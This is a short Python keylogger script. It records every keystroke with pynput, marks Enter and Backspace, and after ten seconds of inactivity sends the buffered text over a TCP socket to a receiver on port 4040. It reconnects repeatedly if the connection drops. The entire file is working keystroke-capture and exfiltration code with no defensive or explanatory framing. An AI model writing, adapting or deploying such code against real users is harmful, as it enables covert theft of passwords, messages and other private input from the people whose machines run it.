from pynput.keyboard import Key, Listener
from threading import Timer
import socket, time, os

#make a socket and a timer... make a bool for the writing
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)



write_string = ""
is_restarting = True
def send_string():
    if is_restarting == False:
        try:
            global write_string
            print("Send string to server ", write_string)
            s.send(bytes(write_string, "UTF-8"))
            write_string = ""
        except:
            raise SystemExit
        else:
            print("Sending was succesfull")

reconnect_attempt = 1
reconnection_time = 0.5
#trying to connect... if no errors receive the servers message

connection = False
def connect():
    global connection
    while True:
        try:
            s.connect((socket.gethostname(), 4040)) #Connect to the receiver
        except:
            connection = False
            time.sleep(5) #if failed try again in 5 seconds
        else:
            connection = True
            msg = s.recv(1024)
            print(msg.decode("UTF-8")) #if succesful receive the servers message and continue :)
            reconnect_attempt = 1
            reconnection_time = 0.5
            break
connect()

def newtimer():
    global t
    t = Timer(10.0, send_string)
newtimer()

# keyboard capturing
def on_release_of_key(key):
    global write_string
    if key == Key.space:
        write_string += " "
        print(write_string)
    elif key == Key.shift or key == Key.shift_r or key == Key.ctrl_l or key == Key.ctrl_r or key == Key.tab or key == Key.caps_lock or key == Key.alt_l or key == Key.alt_r or key == Key.esc:
        write_string += ""
    elif key == Key.enter:
        write_string += "(EN)"
        print(write_string)
    elif key == Key.backspace:
        write_string += "(BS)"
        print(write_string)
    else:
        write_string += str(key).replace("'", "")
        print(write_string)


def on_press(key):
    global is_restarting
    is_restarting = True
    t.cancel()
    newtimer()
    t.start()
    is_restarting = False

def start_keyboard_listener():
    listener = Listener(on_release=on_release_of_key, on_press=on_press) #start the keyboard listener
    listener.start()
start_keyboard_listener()

while True:
    try:
        s.send(bytes("test", "UTF-8"))
    except:
        if reconnect_attempt != 11:
            connection = False
            print(f"Connection lost to server... trying again every {reconnection_time} seconds... attempt {reconnect_attempt}")
            print("")
            connect()
            reconnection_time = reconnection_time*2
        else:
            raise SystemExit
    time.sleep(reconnection_time)

